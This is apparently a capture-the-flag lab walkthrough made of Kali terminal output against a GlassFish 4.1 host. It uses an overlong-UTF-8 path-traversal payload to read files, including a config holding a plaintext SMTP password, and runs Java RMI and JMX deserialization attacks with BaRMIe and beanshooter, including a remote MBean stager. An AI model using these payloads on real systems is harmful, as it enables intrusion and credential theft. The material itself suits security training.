000006587:   200        4 L      32 W       276 Ch      "windows/windowsupdate.log"                                                                            
000006379:   200        36823    358900 W   4910242 C   "Windows/Logs/MoSetup/UpdateAgent.log"                                                                 
                        L                   h                                                                                                                  
000006568:   200        696 L    5175 W     102518 Ch   "Windows/SysWOW64/winrm/0409/winrm.ini"                                                                
000006586:   200        7 L      12 W       92 Ch       "windows/win.ini"                                                                                      
000006585:   200        1364 L   10757 W    235903 Ch   "Windows/Temp/msedge_installer.log"                                                                    
000006373:   200        45921    681177 W   8425059 C   "Windows/Logs/CBS/CBS.log"                                                                             
                        L                   h                                                                                                                  
000006534:   200        9 L      1078 W     4194273 C   "Windows/System32/MsDtc/MSDTC.LOG"                                                                     
                                            h                                                                                                                  

Total time: 0
Processed Requests: 6611
Filtered Requests: 4909
Requests/sec.: 0

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## Java RMX Deserialisation

```
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/administrator/desktop/test.txt' 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>GlassFish Server Open Source Edition  4.1  - Error report</title><style type="text/css"><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - Not Found</h1><hr/><p><b>type</b> Status report</p><p><b>message</b>Not Found</p><p><b>description</b>The requested resource is not available.</p><hr/><h3>GlassFish Server Open Source Edition  4.1 </h3></body></html>                                                                                                      
```

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo java -jar BaRMIe_v1.01.jar  -attack  192.168.90.168 7676                                                                                                 130 ⨯
[sudo] password for kali: 

  ▄▄▄▄    ▄▄▄       ██▀███   ███▄ ▄███▓ ██▓▓█████ 
 ▓█████▄ ▒████▄    ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓██▒▓█   ▀ 
 ▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██    ▓██░▒██▒▒███   
 ▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▒██    ▒██ ░██░▒▓█  ▄ 
 ░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒   ░██▒░██░░▒████▒
 ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▓  ░░ ▒░ ░
 ▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░  ░      ░ ▒ ░ ░ ░  ░
  ░    ░   ░   ▒     ░░   ░ ░      ░    ▒ ░   ░   
  ░            ░  ░   ░            ░    ░     ░  ░
       ░                                     v1.0
             Java RMI enumeration tool.
               Written by Nicky Bloor (@NickstaDB)

Warning: BaRMIe was written to aid security professionals in identifying the
         insecure use of RMI services on systems which the user has prior
         permission to attack. BaRMIe must be used in accordance with all
         relevant laws. Failure to do so could lead to your prosecution.
         The developers assume no liability and are not responsible for any
         misuse or damage caused by this program.

Enumerating 1 target(s)...
[-] An exception occurred during the PassThroughProxyThread main loop.
        java.net.SocketException: Socket closed

Target summary:
  192.168.90.168:7676
    Available attacks:
      [---] Java RMI registry illegal bind deserialization

Target selection
 1) 192.168.90.168:7676 Reliability [---], Deser attack [Y], payload [?]
Select a target to attack (q to quit): 1

Available attacks for target: 192.168.90.168:7676
 1) [---] Java RMI registry illegal bind deserialization
Select an attack to execute (b to back up, q to quit): 1

Attack: Java RMI registry illegal bind deserialization [---]

Java version 6u131, 7u121, 8u121 and below, and JRockit R28.3.12 and below do not validate the types of the parameter to the RMI Registry.bind() method at the server side prior to deserializing them. This enables us to inject a deserialization payload at the network level by replacing either parameter to bind() with a payload object.

Deserialization payloads for: 192.168.90.168:7676
 1) Apache Commons Collections 3.1, 3.2, 3.2.1
 2) Apache Commons Collections 4.0-alpha1, 4.0
 3) Apache Groovy 1.7-beta-1 to 2.4.0-beta-4
 4) Apache Groovy 2.4.0-rc1 to 2.4.3
 5) JBoss Interceptors API
 6) ROME 0.5 to 1.0
 7) ROME 1.5 to 1.7.3
 8) Mozilla Rhino 1.7r2
 9) Mozilla Rhino 1.7r2 for Java 1.4
 10) Mozilla Rhino 1.7r3
 11) Mozilla Rhino 1.7r3 for Java 1.4
 12) Mozilla Rhino 1.7r4 and 1.7r5
 13) Mozilla Rhino 1.7r6, 1.7r7, and 1.7.7.1
 a) Try all available deserialization payloads
Select a payload to use (b to back up, q to quit): a

Enter an OS command to execute:    
```

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo java -jar BaRMIe_v1.01.jar  -attack  192.168.90.168 8686                                                                                                 130 ⨯

  ▄▄▄▄    ▄▄▄       ██▀███   ███▄ ▄███▓ ██▓▓█████ 
 ▓█████▄ ▒████▄    ▓██ ▒ ██▒▓██▒▀█▀ ██▒▓██▒▓█   ▀ 
 ▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒▓██    ▓██░▒██▒▒███   
 ▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ▒██    ▒██ ░██░▒▓█  ▄ 
 ░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒▒██▒   ░██▒░██░░▒████▒
 ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▓  ░░ ▒░ ░
 ▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░░  ░      ░ ▒ ░ ░ ░  ░
  ░    ░   ░   ▒     ░░   ░ ░      ░    ▒ ░   ░   
  ░            ░  ░   ░            ░    ░     ░  ░
       ░                                     v1.0
             Java RMI enumeration tool.
               Written by Nicky Bloor (@NickstaDB)

Warning: BaRMIe was written to aid security professionals in identifying the
         insecure use of RMI services on systems which the user has prior
         permission to attack. BaRMIe must be used in accordance with all
         relevant laws. Failure to do so could lead to your prosecution.
         The developers assume no liability and are not responsible for any
         misuse or damage caused by this program.

Enumerating 1 target(s)...
[-] An exception occurred during the PassThroughProxyThread main loop.
        java.net.SocketException: Socket closed
[-] An exception occurred during the ReplyDataCapturingProxyThread main loop.
        java.net.SocketException: Socket closed

Target summary:
  192.168.90.168:8686
    Available attacks:
      [--+] JMX Deserialization
      [---] Java RMI registry illegal bind deserialization

Target selection
 1) 192.168.90.168:8686 Reliability [--+], Deser attack [Y], payload [?]
Select a target to attack (q to quit): 

```

## SMTP Password leak

```
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml'
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
        <parameters>
                <parameter name="adminEmail" type="1" value="admin@fish.pg"></parameter>
                <parameter name="smtpSecurity" type="1" value="None"></parameter>
                <parameter name="jvmPath" type="1" value="jre/bin/java"></parameter>
                <parameter name="userHomeRoot" type="1" value="C:\ProgramData\SynaManHome"></parameter>
                <parameter name="httpPortSSL" type="2" value="-1"></parameter>
                <parameter name="vmParams" type="1" value="-Xmx128m -DLoggingConfigFile=logconfig.xml"></parameter>
                <parameter name="httpPort" type="2" value="0"></parameter>
                <parameter name="synametricsUrl" type="1" value="http://synametrics.com/SynametricsWebApp/"></parameter>
                <parameter name="lastSelectedTab" type="1" value="1"></parameter>
                <parameter name="emailServerWebServicePort" type="2" value=""></parameter>
                <parameter name="imagePath" type="1" value="images/"></parameter>
                <parameter name="publicIPForUrl" type="1" value=""></parameter>
                <parameter name="defaultOperation" type="1" value="frontPage"></parameter>
                <parameter name="httpPort2" type="2" value="6060"></parameter>
                <parameter name="useUPnP" type="4" value="true"></parameter>
                <parameter name="smtpServer" type="1" value="mail.fish.pg"></parameter>
                <parameter name="smtpUser" type="1" value="arthur"></parameter>
                <parameter name="InitialSetupComplete" type="4" value="true"></parameter>
                <parameter name="failureOverHttpPort" type="2" value="55222"></parameter>
                <parameter name="disableCsrfPrevention" type="4" value="true"></parameter>
                <parameter name="httpIP" type="1" value=""></parameter>
                <parameter name="smtpPort" type="2" value="25"></parameter>
                <parameter name="emailServerWebServiceHost" type="1" value=""></parameter>
                <parameter name="smtpPassword" type="1" value="KingOfAtlantis"></parameter>
                <parameter name="ntServiceCommand" type="1" value="net start SynaMan"></parameter>
                <parameter name="mimicHtmlFiles" type="4" value="false"></parameter>
        </parameters>
</Configuration>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/authur/desktop/local.txt'
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><title>GlassFish Server Open Source Edition  4.1  - Error report</title><style type="text/css"><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 404 - Not Found</h1><hr/><p><b>type</b> Status report</p><p><b>message</b>Not Found</p><p><b>description</b>The requested resource is not available.</p><hr/><h3>GlassFish Server Open Source Edition  4.1 </h3></body></html>                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl 'http://192.168.90.168:4848/theme/com%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afusers/arthur/desktop/local.txt'
62ad4d7fe251353115d2f4da7fcc1be9
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## Java Test

```
┌──(kali㉿kali)-[~/Documents/tools/beanshooter/target]
└─$ ./beanshooter.jar 192.168.90.168 8686 status                                                                                                                    1 ⨯
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Connecting to JMX server... 
[+] RMI object tries to connect to different remote host: 169.254.52.147
[+]     Redirecting the connection back to 192.168.90.168... 
[+]     This is done for all further requests. This message is not shown again.
[+] Creating MBeanServerConnection... 
[+] Getting Status of MLet... done!
[+]     MLet is not registered on the JMX server.
[+] Getting Status of malicious Bean... done!
[+]     Malicious MBean is not registered on the JMX server.
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Documents/tools/beanshooter/target]
└─$ sudo ./beanshooter.jar --stager-host 192.168.49.90 --stager-port 8080  192.168.90.168 8686 deployAll
[+] Connecting to JMX server... 
[+] RMI object tries to connect to different remote host: 169.254.52.147
[+]     Redirecting the connection back to 192.168.90.168... 
[+]     This is done for all further requests. This message is not shown again.
[+] Creating MBeanServerConnection... 
[+] Creating MBean 'MLet' for remote deploymet... done!
[+] 
[+] Malicious MBean seems not to be registered on the server.
[+] Starting registration process:
[-]     Unable to find MBean /opt/beanshooter/tonka-bean/target/tonka-bean.jar for deployment.
[-]     Stopping execution.
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Documents/tools/beanshooter/target]
└─$
```


# Privesc

# Others